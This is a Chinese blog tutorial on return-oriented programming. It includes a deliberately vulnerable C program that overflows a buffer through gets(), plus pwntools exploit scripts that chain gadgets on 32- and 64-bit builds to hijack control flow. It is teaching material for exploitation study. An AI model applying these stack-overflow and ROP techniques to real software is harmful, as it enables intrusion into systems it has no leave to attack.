@@ -1,0 +1,331 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0068d7"><meta name="author" content="ZLTT"><meta name="copyright" content="ZLTT"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>从0开始学pwn-2-ROP | ZLTT的博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/yun.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><link rel="icon" type="image/png" href="/pic/favicon.ico"><link rel="mask-icon" href="/pic/favicon.ico" color="#0068d7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"zltt197.github.io","root":"/","title":"竹林听涛","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"/say.json"},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="stylesheet" href="/css/bg.css"><script src="/js/bg.js" defer></script><meta name="description" content="ROP,全称是Return-oriented Programming(面向返回编程)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从0开始学pwn-2-ROP">
+<meta property="og:url" content="http://zltt197.github.io/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/index.html">
+<meta property="og:site_name" content="ZLTT的博客">
+<meta property="og:description" content="ROP,全称是Return-oriented Programming(面向返回编程)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112011513190.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112011523067.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112011530754.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112011541883.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032047369.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032100422.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032104635.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032144247.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032159160.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032159746.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032159476.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032200786.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032200736.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032200671.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032203327.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112032221375.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112041432975.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112041431028.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112041433342.png">
+<meta property="og:image" content="https://gitee.com/zltt-tc/image/raw/master/202112041443272.png">
+<meta property="article:published_time" content="2021-11-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-30T16:00:00.000Z">
+<meta property="article:author" content="ZLTT">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zltt-tc/image/raw/master/202112011513190.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ZLTT"><img width="96" loading="lazy" src="/pic/zltt.png" alt="ZLTT"></a><div class="site-author-name"><a href="/about/">ZLTT</a></div><span class="site-name">ZLTT的博客</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">6</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFROP"><span class="toc-number">1.</span> <span class="toc-text">什么是ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">相关工具介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32%E4%BD%8DROP"><span class="toc-number">3.</span> <span class="toc-text">32位ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E4%B8%8B%E4%BC%AA%E9%80%A0%E5%8F%82%E6%95%B0%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">32位下伪造参数调用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E4%B8%8B%E8%BF%9E%E7%BB%AD%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">32位下连续调用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8DROP"><span class="toc-number">4.</span> <span class="toc-text">64位ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8B%E4%BC%AA%E9%80%A0%E5%8F%82%E6%95%B0%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">64位下伪造参数调用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8B%E8%BF%9E%E7%BB%AD%E8%B0%83%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">64位下连续调用参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E4%B9%89%E4%B8%8A%E7%9A%84ROP"><span class="toc-number">5.1.</span> <span class="toc-text">广义上的ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E7%9A%84ROP%E5%BA%94%E7%94%A8"><span class="toc-number">5.2.</span> <span class="toc-text">高级的ROP应用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">附件</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://zltt197.github.io/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ZLTT"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ZLTT的博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">从0开始学pwn-2-ROP</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2021-12-01 00:00:00" itemprop="dateCreated datePublished" datetime="2021-12-01T00:00:00+08:00">2021-12-01</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">从0开始学pwn</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">网络安全</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0068d7;"><p>ROP,全称是Return-oriented Programming(面向返回编程)</p>
+<span id="more"></span>
+
+<h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP是一种用于绕过各种现代操作系统防御(例如NX,内存不可执行防御)的技术,也是众多高级利用手法的基础<br>ROP的方法的核心在于,利用每个函数最都会有的ret指令,使用可以被控制的栈来伪造或操纵参数,以达到连续,多次调用函数,并伪造参数的目的<br>在ROP的过程中,ret的作用不再是返回到调用函数,而是起到将多个代码片段拼接起来的作用,故而称之为面向返回编程<br>ROP最为精妙的地方在于,它执行的所有代码,都是程序本身的代码,用正常代码达到了恶意代码的效果,并且不容易被检测到,我愿称之为代码张三丰,借力打力那叫一个6</p>
+<h2 id="相关工具介绍"><a href="#相关工具介绍" class="headerlink" title="相关工具介绍"></a>相关工具介绍</h2><p>想要使用ROP,需要以ret为结尾(当然有些情况下也可以不是)的代码块,除了一整个函数这样的,更多的是ret前面就一两句这种,比如[pop rdi;ret;]这种,我们称这种小代码片段为gadget<br>寻找gadget的工具常用的有ROPgadget和ropper,其中ROPgadget是pwntools自带的工具</p>
+<h2 id="32位ROP"><a href="#32位ROP" class="headerlink" title="32位ROP"></a>32位ROP</h2><h3 id="32位下伪造参数调用函数"><a href="#32位下伪造参数调用函数" class="headerlink" title="32位下伪造参数调用函数"></a>32位下伪造参数调用函数</h3><p>在32位下,伪造参数调用函数很简单,让我们先复习一下函数的调用过程<br>首先,参数被依次压入栈中,然后,返回地址入栈,然后进入函数<br>就到这里就行了,可以看出,在进入函数之前,栈上的结构是这样的<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011513190.png" loading="lazy"> </p>
+<p>再回过头来看看栈溢出劫持控制流的过程中,栈帧的结构<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011523067.png" loading="lazy"> </p>
+<p>当栈溢出劫持成功之后,就该是这样的<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011530754.png" loading="lazy"> </p>
+<p>那么想要再栈溢出劫持的时候伪造参数该怎么办呢?很简单,在要跳转的函数的地址下面伪造一个进栈之前的结构就行了<br><img src="https://gitee.com/zltt-tc/image/raw/master/202112011541883.png" loading="lazy"> </p>
+<p>具体的,让我们用一个例子来试一试</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+char *str1=&quot;this is a string&quot;;
+char *str2=&quot;this is a string too&quot;;
+char *str3=&quot;this is also a string&quot;;
+
+void fun(char* str)
+&#123;
+    puts(str);
+&#125;
+
+void vul()
+&#123;
+    puts(&quot;ROP&quot;);
+    char buf[16];
+    gets(buf);
+&#125;
+
+int main()
+&#123;
+    vul();
+&#125;
+</code></pre>
+<p>先放exp</p>
+<pre><code>from pwn import *
+
+p=process(&quot;./基础ROP-32位&quot;)
+
+fun=0x08049186
+str1=0x0804A008
+main=0x080491E6
+
+payload=b&quot;a&quot;*0x1c
+payload+=p32(fun)
+payload+=p32(main)
+payload+=p32(str1)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>看一下效果</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032047369.png" loading="lazy"> </p>
+<p>可以看到,我们跳转到的是fun函数,伪造了fun函数的参数(str1),和返回地址(main),所以先输出了”ROP”,随后程序被劫持到了fun(str1),输出了”this is a string”,fun函数结束后又回到被伪造的返回地址(main),再继续运行</p>
+<p>使用gdb来更清晰的还原整个过程</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032100422.png" loading="lazy"> </p>
+<p>可以看到,在ret进入fun函数之后,栈上的结构是这样的:main,str1</p>
+<p>而正常call进入函数的时候,函数的栈顶往下是这样的:返回地址,参数</p>
+<p>所以这里main就成为了伪造的返回地址,str1成为了伪造的参数</p>
+<p>那么继续运行</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032104635.png" loading="lazy"> </p>
+<p>可以看到,fun在ret的时候是ret到main去了的,所以程序又会从main开始执行一遍</p>
+<p>那么我们就明白了怎么构造32位下的伪造函数参数了,即把返回地址和参数跟在跳转地址后面就行了(假如返回地址不重要,你也可以乱写一个返回地址)</p>
+<h3 id="32位下连续调用函数"><a href="#32位下连续调用函数" class="headerlink" title="32位下连续调用函数"></a>32位下连续调用函数</h3><p>上面我们明白了怎么伪造一个函数的参数去调用它</p>
+<p>然而当我们尝试连续调用时就会发现一个问题</p>
+<p>例如这里我要调用fun(str1);fun(str2),然后返回main</p>
+<p>构造第一次调用很简单</p>
+<pre><code>payload=b&quot;a&quot;*0x1c
+payload+=p32(fun)
+payload+=p32(fun)
+payload+=p32(str1)
+</code></pre>
+<p>但是你就会发现,第二个fun的参数和返回地址不好写,由于第二个fun的位置在第一个fun的返回地址,所以第二个fun的返回地址位置和第一个fun的参数位置重合了(也就是都该在上面的str1处)</p>
+<p>在这种情况下,我们可以借助形似pop xxx;ret的gadget来串联调用</p>
+<p>用ROPgadget查找这样的gadget</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032144247.png" loading="lazy"> </p>
+<pre><code>pop1=0x08049022
+
+payload=b&quot;a&quot;*0x1c
+
+payload+=p32(fun)
+payload+=p32(pop1)
+payload+=p32(str1)
+
+payload+=p32(fun)
+payload+=p32(main)
+payload+=p32(str2)
+</code></pre>
+<p>这样,就可以使用这个pop将栈里面第一个fun的参数pop出来,这样就可以直接在后面添加第二次调用了</p>
+<p>完整exp</p>
+<pre><code>from pwn import *
+
+p=process(&quot;./基础ROP-32位&quot;)
+
+fun=0x08049186
+str1=0x0804A008
+str2=0x0804A019
+main=0x080491E6
+pop1=0x08049022
+
+payload=b&quot;a&quot;*0x1c
+
+payload+=p32(fun)
+payload+=p32(pop1)
+payload+=p32(str1)
+
+payload+=p32(fun)
+payload+=p32(main)
+payload+=p32(str2)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>效果</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159160.png" loading="lazy"> </p>
+<p>来用gdb看一下这个过程</p>
+<p>首先,在ret第一次进入fun时,栈上有返回地址(pop ebx,ret),然后是参数(str1)</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159746.png" loading="lazy"> </p>
+<p>在第一次fun的结尾,准备执行pop ebx,ret</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032159476.png" loading="lazy"> </p>
+<p>到了pop ebx;ret;后,pop ebx将栈中的第一个fun的参数(str1)弹出,ret使程序进入第二个fun</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200786.png" loading="lazy"> </p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200736.png" loading="lazy"> </p>
+<p>第二次进入fun,可以看到栈上是第二次fun的返回地址(main)和参数(str2)</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032200671.png" loading="lazy"> </p>
+<p>第二次fun执行完后,回到了main</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032203327.png" loading="lazy"> </p>
+<p>那么32位的连续调用就是这样,通过pop+ret的方式来串联各次调用</p>
+<p>3次,乃至更多次调用函数都是一样的</p>
+<p>下面是一个3次调用fun后返回main的exp</p>
+<pre><code>from pwn import *
+
+p=process(&quot;./基础ROP-32位&quot;)
+
+fun=0x08049186
+str1=0x0804A008
+str2=0x0804A019
+str3=0x0804A02E
+main=0x080491E6
+pop1=0x08049022
+
+payload=b&quot;a&quot;*0x1c
+
+payload+=p32(fun)
+payload+=p32(pop1)
+payload+=p32(str1)
+
+payload+=p32(fun)
+payload+=p32(pop1)
+payload+=p32(str2)
+
+payload+=p32(fun)
+payload+=p32(main)
+payload+=p32(str3)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>当然,假如这个函数有两个参数,就得用pop xxx;pop xxx;ret这种gadget了,更多的参数依次类推</p>
+<h2 id="64位ROP"><a href="#64位ROP" class="headerlink" title="64位ROP"></a>64位ROP</h2><h3 id="64位下伪造参数调用函数"><a href="#64位下伪造参数调用函数" class="headerlink" title="64位下伪造参数调用函数"></a>64位下伪造参数调用函数</h3><p>希望你还没有忘记,64位下前六个参数是通过寄存器传递的(rdi,rsi,rdx,rcx,r8,r9)</p>
+<p>绝大多数函数都不会超过六个参数,也就是说64位绝大多数函数都通过寄存器传参</p>
+<p>这种情况下,我们就需要通过栈来控制寄存器,需要借助类似pop rdi;ret;这样的gadget</p>
+<p>还是这个程序</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+char *str1=&quot;this is a string&quot;;
+char *str2=&quot;this is a string too&quot;;
+char *str3=&quot;this is also a string&quot;;
+
+void fun(char* str)
+&#123;
+    puts(str);
+&#125;
+
+void vul()
+&#123;
+    puts(&quot;ROP&quot;);
+    char buf[16];
+    gets(buf);
+&#125;
+
+int main()
+&#123;
+    vul();
+&#125;
+</code></pre>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112032221375.png" loading="lazy"> </p>
+<p>ROPgadget很容易查到了能够控制rdi和rsi的gadget(这两条gadget在__libc_csu_init函数里,在gcc11以前的版本中,编译的每一个程序中都有这个函数)</p>
+<p>注意rsi的gadget还有一个pop r15,反正r15一般用不到,直接乱填一个占位就行了</p>
+<p>由于这里我的fun函数只有一个参数,只需要控制rdi就可以了</p>
+<p>exp</p>
+<pre><code>from pwn import *
+
+p=process(&quot;./基础ROP-64位&quot;)
+
+fun=0x4004F7
+str1=0x4005D4
+main=0x40053A
+rdi=0x4005b3
+
+payload=b&quot;a&quot;*0x18
+payload+=p64(rdi)
+payload+=p64(str1)
+payload+=p64(fun)
+payload+=p64(main)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>gdb看一看</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041432975.png" loading="lazy"> </p>
+<p>由pop rdi将栈上的参数放入rdi</p>
+<p>然后进入fun函数</p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041431028.png" loading="lazy"> </p>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041433342.png" loading="lazy"> </p>
+<p>可以看到,进入fun函数时,rdi的值就是第一个参数,也就是str1</p>
+<h3 id="64位下连续调用参数"><a href="#64位下连续调用参数" class="headerlink" title="64位下连续调用参数"></a>64位下连续调用参数</h3><p>相比其32位,64位中连续调用函数则简单的多,因为参数不在栈上,不需要额外的pop来调整,直接顺着写过去就行</p>
+<p>exp</p>
+<pre><code>from pwn import *
+
+p=process(&quot;./基础ROP-64位&quot;)
+
+fun=0x4004F7
+str1=0x4005D4
+str2=0x4005E5
+str3=0x4005FA
+main=0x40053A
+rdi=0x4005b3
+
+payload=b&quot;a&quot;*0x18
+payload+=p64(rdi)
+payload+=p64(str1)
+payload+=p64(fun)
+
+payload+=p64(rdi)
+payload+=p64(str2)
+payload+=p64(fun)
+
+payload+=p64(rdi)
+payload+=p64(str3)
+payload+=p64(fun)
+
+payload+=p64(main)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p><img src="https://gitee.com/zltt-tc/image/raw/master/202112041443272.png" loading="lazy"> </p>
+<p>很简单,就是把下一个函数开始伪造参数的地方写在上一个函数的后面(也就是返回地址),不需要排布,就不赘述了</p>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="广义上的ROP"><a href="#广义上的ROP" class="headerlink" title="广义上的ROP"></a>广义上的ROP</h3><p>广义上的ROP还包括了JOP(Jump-oriented Programming,面向跳转编程)和COP(Call-oriented Programming,面向调用编程)等,其gedget不一定是以ret为结尾,也可以以jmp,甚至以call结尾</p>
+<p>例如找不到pop rcx;ret;,但是存在pop rax;pop rcx;jmp rax;这样的,其效果和ret是一样的,核心就在于要灵活运用跳转指令,要能够根据实际情况串联ROP链</p>
+<h3 id="高级的ROP应用"><a href="#高级的ROP应用" class="headerlink" title="高级的ROP应用"></a>高级的ROP应用</h3><p>由于ROP是一种很基础的手法,其结合其他一些机制,可以诞生很多更为高级的运用,比如SROP和ret2dlresolve,这些让我们后面再谈</p>
+<h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>本篇博客所有使用到的代码和程序均可在以下链接获取</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1emnc_qRzXw9BkOUpqno8hA">百度云</a> 密码: 6hud</p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ZLTT</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://zltt197.github.io/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/" title="从0开始学pwn-2-ROP">http://zltt197.github.io/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/12/18/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-3-ret2shellcode/" rel="prev" title="从0开始学pwn-3-ret2shellcode"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">从0开始学pwn-3-ret2shellcode</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/11/26/pwntools%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/" rel="next" title="pwntools常用语句"><span class="post-nav-text">pwntools常用语句</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div id="waline"></div><script>Yun.utils.getScript("/js/waline.js", () => {
+  const walineConfig = {"enable":true,"serverURL":"https://blog-talk-api.vercel.app/","comment":false,"avatar":"mp","avatarCDN":"https://cn.gravatar.com/avatar/","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/alus","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq"],"el":"#waline","lang":"zh-CN"}
+  walineConfig.path = "/2021/12/01/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6pwn-2-ROP/"
+  walineConfig.dark = 'html[data-user-color-scheme="dark"]'
+  new Waline(walineConfig)
+}, window.Waline);</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> ZLTT</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.4.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0068d7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div></body></html>
